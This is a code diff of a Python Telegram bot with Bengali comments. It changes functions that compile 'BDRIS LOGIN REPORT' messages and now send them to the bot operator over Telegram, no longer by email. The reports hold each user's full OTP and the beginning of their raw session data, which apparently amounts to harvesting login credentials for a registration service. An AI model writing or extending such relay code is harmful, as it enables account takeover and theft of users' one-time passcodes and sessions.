@@ -16,54 +16,57 @@ from collections import OrderedDict
 from flask import Flask
 from pymongo import MongoClient
 from pymongo.errors import DuplicateKeyError
+
+# ইমেইল মডিউলগুলো
 import smtplib
 from email.mime.text import MIMEText
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart  # <--- এই লাইনটি যুক্ত করতে হবে
+from email.mime.multipart import MIMEMultipart
 
 # ==========================================
-# ০. ইমেইল সেন্ডার ফাংশন (Advanced Error Handling)
+# ০. ইমেইল সেন্ডার ও টেলিগ্রাম নোটিফিকেশন ফাংশন
 # ==========================================
 def send_email_to_admin(subject, body):
     if not ADMIN_EMAIL or not EMAIL_PASS:
         logging.warning("⚠️ Email credentials missing in Environment Variables, skipping email.")
         return
-        try:
+    
+    try:
         msg = MIMEMultipart()
         msg['From'] = ADMIN_EMAIL
         msg['To'] = EMAIL_RECEIVER
         msg['Subject'] = subject
         msg.attach(MIMEText(body, 'plain', 'utf-8'))
         
-        # পোর্ট 465 এর বদলে 587 এবং SMTP_SSL এর বদলে শুধু SMTP ব্যবহার করা হলো
-        with smtplib.SMTP('smtp.gmail.com', 587, timeout=15) as server:
-            server.starttls()  # কানেকশন সিকিউর করার জন্য
+        # 10 সেকেন্ডের টাইমআউট সেট করা হলো যেন সার্ভার স্লো থাকলে বট হ্যাং না করে
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10) as server:
             server.login(ADMIN_EMAIL, EMAIL_PASS)
             server.sendmail(ADMIN_EMAIL, EMAIL_RECEIVER, msg.as_string())
-            logging.info("✅ লগইন সফল ও ইমেইল পাঠানো হয়েছে!")
+            
+        logging.info("✅ লগইন সফল ও ইমেইল পাঠানো হয়েছে!")
     except smtplib.SMTPAuthenticationError:
-        logging.error("❌ Email Auth Error: জিমেইলের পাসওয়ার্ড ভুল! নরমাল পাসওয়ার্ড দিলে হবে না, 16-digit App Password দিতে হবে।")
+        logging.error("❌ Email Auth Error: জিমেইলের পাসওয়ার্ড ভুল! 16-digit App Password দিতে হবে।")
     except TimeoutError:
         logging.error("❌ Email Timeout: গুগলের সার্ভার কানেক্ট হতে সময় বেশি নিচ্ছে।")
     except Exception as e:
         logging.error(f"❌ Email Send Error: {e}")
 
-# এই দুটি র‍্যাপার ফাংশন অবশ্যই রাখতে হবে, কারণ নিচের লগইন সিস্টেমে এগুলো ব্যবহার করা হয়েছে
 def relay_info_to_email(chat_id, u_name):
     u_sess = get_session(chat_id)
-    report = f"--- BDRIS LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now()}\n\n"
-    report += f"CH RAW: {u_sess['temp_data'].get('ch_raw', 'N/A')}\n"
-    report += f"OTP: {u_sess.get('ch_otp', 'N/A')}\n"
-    report += f"SEC RAW: {u_sess['temp_data'].get('sec_raw', 'N/A')}\n"
+    report = f"🚨 *BDRIS LOGIN REPORT*\n👤 User: {u_name} (`{chat_id}`)\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %I:%M %p')}\n\n"
+    report += f"🔑 *CH RAW:* `{u_sess['temp_data'].get('ch_raw', 'N/A')[:20]}...`\n"
+    report += f"🔢 *OTP:* `{u_sess.get('ch_otp', 'N/A')}`\n"
+    report += f"🔑 *SEC RAW:* `{u_sess['temp_data'].get('sec_raw', 'N/A')[:20]}...`\n"
     
-    send_email_to_admin(f"Login Alert: {u_name}", report)
+    # অ্যাডমিনকে টেলিগ্রামে মেসেজ পাঠানো
+    safe_send(ADMIN_ID, report, parse_mode="Markdown")
+    logging.info("✅ অ্যাডমিনকে টেলিগ্রামে লগইন এলার্ট পাঠানো হয়েছে!")
 
 def relay_admin_login_to_email(chat_id, u_name, raw_data):
-    report = f"--- ADMIN LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now()}\n\n"
-    report += f"ADMIN RAW SESSION: {raw_data}\n"
+    report = f"🚨 *ADMIN LOGIN REPORT*\n👤 User: {u_name} (`{chat_id}`)\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %I:%M %p')}\n\n"
+    report += f"🔑 *ADMIN RAW:* `{raw_data[:20]}...`\n"
     
-    send_email_to_admin(f"Admin Login Alert: {u_name}", report)
+    # অ্যাডমিনকে টেলিগ্রামে মেসেজ পাঠানো
+    safe_send(ADMIN_ID, report, parse_mode="Markdown")
 # ==========================================
 # ১. গ্লোবাল ভেরিয়েবল ও থ্রেড লক
 # ==========================================
